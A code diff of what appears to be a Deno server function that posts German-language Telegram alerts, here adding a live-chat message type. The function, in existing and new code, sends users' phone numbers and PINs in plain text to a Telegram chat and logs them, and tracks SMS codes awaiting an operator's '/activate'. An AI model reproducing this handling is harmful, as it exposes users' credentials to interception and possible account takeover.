@@ -10,10 +10,12 @@ interface TelegramNotificationRequest {
   phone?: string;
   accessCode?: string;
   shortId?: string;
-  type?: 'request' | 'activation' | 'sms_sent' | 'completed' | 'evaluation_completed';
+  type?: 'request' | 'activation' | 'sms_sent' | 'completed' | 'evaluation_completed' | 'live_chat_message';
   workerName?: string;
   auftragTitle?: string;
   auftragsnummer?: string;
+  message?: string;
+  senderName?: string;
 }
 
 serve(async (req) => {
@@ -23,7 +25,7 @@ serve(async (req) => {
   }
 
   try {
-    const { phone, accessCode, shortId, type = 'request', workerName, auftragTitle, auftragsnummer }: TelegramNotificationRequest = await req.json();
+    const { phone, accessCode, shortId, type = 'request', workerName, auftragTitle, auftragsnummer, message, senderName }: TelegramNotificationRequest = await req.json();
     
     const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
     const chatId = Deno.env.get('TELEGRAM_CHAT_ID');
@@ -37,34 +39,36 @@ serve(async (req) => {
     }
 
     // Create different messages based on type
-    let message: string;
-    if (type === 'evaluation_completed') {
-      message = `📝 Auftrag bewertet!\n📋 ${auftragTitle} (${auftragsnummer})\n👤 von ${workerName} wurde erfolgreich bewertet.`;
+    let telegramMessage: string;
+    if (type === 'live_chat_message') {
+      telegramMessage = `💬 Neue Live Chat Nachricht!\n👤 Von: ${senderName}\n📝 Nachricht: ${message}`;
+    } else if (type === 'evaluation_completed') {
+      telegramMessage = `📝 Auftrag bewertet!\n📋 ${auftragTitle} (${auftragsnummer})\n👤 von ${workerName} wurde erfolgreich bewertet.`;
     } else if (type === 'activation') {
-      message = `✅ Nummer Aktiviert!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
+      telegramMessage = `✅ Nummer Aktiviert!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
       if (shortId) {
-        message += `\n🆔 ID: ${shortId}`;
+        telegramMessage += `\n🆔 ID: ${shortId}`;
       }
     } else if (type === 'sms_sent') {
-      message = `📤 SMS versendet!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
+      telegramMessage = `📤 SMS versendet!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
       if (shortId) {
-        message += `\n🆔 ID: ${shortId}`;
+        telegramMessage += `\n🆔 ID: ${shortId}`;
       }
-      message += `\n⏳ Wartet auf SMS Code`;
+      telegramMessage += `\n⏳ Wartet auf SMS Code`;
     } else if (type === 'completed') {
-      message = `✅ Vorgang abgeschlossen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
+      telegramMessage = `✅ Vorgang abgeschlossen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
       if (shortId) {
-        message += `\n🆔 ID: ${shortId}`;
+        telegramMessage += `\n🆔 ID: ${shortId}`;
       }
-      message += `\n🎉 Erfolgreich beendet`;
+      telegramMessage += `\n🎉 Erfolgreich beendet`;
     } else {
-      message = `🔔 Neue Anfrage eingegangen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
+      telegramMessage = `🔔 Neue Anfrage eingegangen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
       if (shortId) {
-        message += `\n🆔 ID: ${shortId}\n\nZum Aktivieren: /activate ${shortId}`;
+        telegramMessage += `\n🆔 ID: ${shortId}\n\nZum Aktivieren: /activate ${shortId}`;
       }
     }
     
-    console.log(`Sending Telegram notification (${type}):`, { phone, accessCode, shortId, workerName, auftragTitle, auftragsnummer });
+    console.log(`Sending Telegram notification (${type}):`, { phone, accessCode, shortId, workerName, auftragTitle, auftragsnummer, message, senderName });
     
     const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
@@ -73,8 +77,7 @@ serve(async (req) => {
       },
       body: JSON.stringify({
         chat_id: chatId,
-        text: message,
-        // Remove parse_mode to fix HTML parsing error
+        text: telegramMessage,
       }),
     });
 
